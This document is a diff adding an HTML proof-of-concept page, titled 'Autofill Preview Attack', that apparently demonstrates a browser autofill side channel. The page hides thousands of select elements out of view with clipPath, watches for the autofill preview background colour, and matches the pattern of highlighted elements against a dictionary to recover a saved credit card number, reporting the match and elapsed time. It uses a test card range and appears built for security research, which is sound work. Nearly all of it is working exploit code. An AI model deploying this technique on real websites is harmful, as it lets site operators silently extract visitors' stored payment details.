@@ -1,0 +1,199 @@
+
+
+<!DOCTYPE html>
+<head>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-180280852-1');
+  </script>
+  <title>Autofill Preview Attack</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script type="text/javascript" src="/javascripts/jszip.min.js"></script>
+  <script type="text/javascript" src="/javascripts/jszip-utils.min.js"></script>
+  <style>
+
+h2{
+  background-color: #4CAF50;
+  color: white;
+}
+#cardname{
+  width: 500px;
+}
+.button {
+background-color: white;
+color: black;
+border: 2px solid #4CAF50;
+}
+  </style>
+
+</head>
+<body>
+  <h1 style="color:#4CAF50;">Try preview</h1>
+  <h2 id="result"></h2>
+  <div>Credit Card Number Range: 4123456789000000 - 4123456789100333</div>
+    <div id="block_container">
+      <div>
+          Credit Card Name <input type="text" id="cardname" placeholder="cardname" onclick="replaceElem()">
+          <button class="button" onclick="show()">Show hidden fields</button>
+      </div>
+      <div id="cardmonth">
+          Credit Card Expiry Month<input type="text" name="ccmonth" id="ccmonth" placeholder="ccmonth">
+    </div>
+    </div>
+    <div id= "hidden_info">
+
+    </div>
+
+</body>
+<script>
+var browser = (function (agent) {
+      switch (true) {
+          case agent.indexOf("edge") > -1: return "edge";
+          case agent.indexOf("edg") > -1: return "chromium based edge (dev or canary)";
+          case agent.indexOf("opr") > -1 && !!window.opr: return "opera";
+          case agent.indexOf("chrome") > -1 && !!window.chrome: return "chrome";
+          case agent.indexOf("trident") > -1: return "ie";
+          case agent.indexOf("firefox") > -1: return "firefox";
+          case agent.indexOf("safari") > -1: return "safari";
+          default: return "other";
+      }
+  })(window.navigator.userAgent.toLowerCase());
+console.log('browser is', browser);
+var color_str = "rgb(232, 240, 254)";
+var isclick = 0;
+var items = {};
+var drop_down = document.getElementById("hidden_info")
+var cardmonth = document.getElementById("cardmonth");
+//drop_down.style.opacity = "0";
+drop_down.style.clipPath = "circle(0%)"
+fetch('input_cc100k.txt')
+.then(response => response.text())
+.then(text => drop_down.innerHTML=text)
+
+fetch('dict_cc100k.json')
+.then(response => response.json())
+.then(jsonResponse => items = jsonResponse)
+
+var startTime, endTime;
+
+function start() {
+startTime = new Date();
+console.log('starting counting time')
+};
+function end() {
+endTime = new Date();
+var timeDiff = endTime - startTime; //in ms
+// strip the ms
+timeDiff /= 1000;
+// get seconds
+var seconds = Math.round(timeDiff);
+console.log(seconds + " seconds");
+return seconds;
+}
+var select_html;
+new JSZip.external.Promise(function (resolve, reject) {
+  JSZipUtils.getBinaryContent('select_cc100k.txt.zip', function(err, data) {
+      if (err) {
+          reject(err);
+      } else {
+          resolve(data);
+      }
+  });
+}).then(function (binaryContent) {
+  return JSZip.loadAsync(binaryContent);
+})
+.then(function(zip){
+  return zip.file("select_cc100k.txt").async("text");
+}).then(function (txt) {
+select_html = txt;
+})
+function replaceElem(){
+  // drop_down.innerHTML = "";
+  start();
+  drop_down.innerHTML = select_html;
+  cardmonth.innerHTML = 'Credit Card Expiry Month<select name="ccmonth" id="ccmonth"><option value="03">03</option></select>';
+  console.log('replaced!')
+  isclick = 1;
+}
+
+function getKeyByValue(object, value) {
+return Object.keys(object).find(key => object[key] === value);
+}
+function arraysEqual(a, b) {
+if (a === b) return true;
+if (a == null || b == null) return false;
+if (a.length != b.length) return false;
+
+for (var i = 0; i < a.length; ++i) {
+  if (a[i] !== b[i]) return false;
+}
+return true;
+}
+
+var cardname = document.getElementById("cardname");
+var flag = 0;
+var items = {};
+var matched_flag = 0;
+var result = document.getElementById("result");
+var intervalId = null;
+intervalId = setInterval(function(){
+  var results = [];
+  var matched;
+  var ccmonth = document.getElementById("ccmonth");
+  if (getComputedStyle(ccmonth).backgroundColor == color_str){
+      console.log("start");
+      flag = 1;
+      }
+  if(flag ==1 && results.length < 1){
+      var selects = drop_down.children;
+      for (var i = 0; i < selects.length; i++) {
+          if (getComputedStyle(selects[i]).backgroundColor != color_str){
+              if(selects[i].id && selects[i].tagName == "SELECT"){
+                  results.push(parseInt(selects[i].id));
+                  console.log("results", results);
+              }
+          }
+      }
+  }
+  for (var key in items) {
+    var value = items[key];
+    if (arraysEqual(value, results)){
+    console.log(key, value);
+    var matched = key;
+    break;
+  }
+  }
+
+if (matched){
+    var time_diff = end();
+    result.innerHTML = 'Matched value: '+ matched +',  Matched menu IDs: '+ results + ', Elapsed time: ' + time_diff + 's';
+  matched_flag = 1;
+  clearInterval(intervalId);
+}
+var isFocused = (document.activeElement === cardname);
+console.log(isFocused);
+if(!isFocused && !matched_flag){
+    if(getComputedStyle(cardname).backgroundColor != color_str){
+      fetch('input_cc100k.txt')
+          .then(response => response.text())
+          .then(text => drop_down.innerHTML=text)
+          cardmonth.innerHTML = 'Credit Card Expiry Month<input type="text" name="ccmonth" id="ccmonth" placeholder="ccmonth">';
+            }
+
+}
+},1000);
+function show(){
+  var showbutton = document.getElementsByClassName("button")[0];
+  if (drop_down.style.clipPath === 'circle(0% at 50% 50%)') {
+      drop_down.style.clipPath = "circle(100% at 50% 50%)";
+      showbutton.innerHTML = "Hide fields";
+  }else {
+      drop_down.style.clipPath = "circle(0% at 50% 50%)";
+      showbutton.innerHTML = "Show hidden fields";
+  }
+}
+      </script>
+    </html>
